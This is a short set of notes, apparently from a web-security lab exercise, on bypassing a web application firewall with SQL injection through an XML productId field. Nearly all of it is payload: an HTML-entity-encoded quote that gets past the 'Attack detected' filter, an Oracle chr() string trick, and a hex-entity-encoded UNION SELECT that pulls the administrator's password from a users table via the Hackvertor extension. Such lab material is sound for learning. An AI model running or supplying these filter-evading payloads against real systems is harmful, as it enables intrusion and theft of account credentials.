```bash
<productId>2'</productId>  // Attack detected

 <productId>2&apos;</productId>  // HTML encode  --  200 OK

 ' and true -- // chr(39)||chr(32)||chr(97)||chr(110)||chr(100)||chr(32)||chr(116)||chr(114)||chr(117)||chr(101)||chr(32)||chr(45)||chr(45)  --  create string in oracle

 Instal Hackvector extension and encode the payload as hex_entities

<productId>
<@hex_entities>
2 union select password from users where username = 'administrator' --
</@hex_entities>
</productId>
```
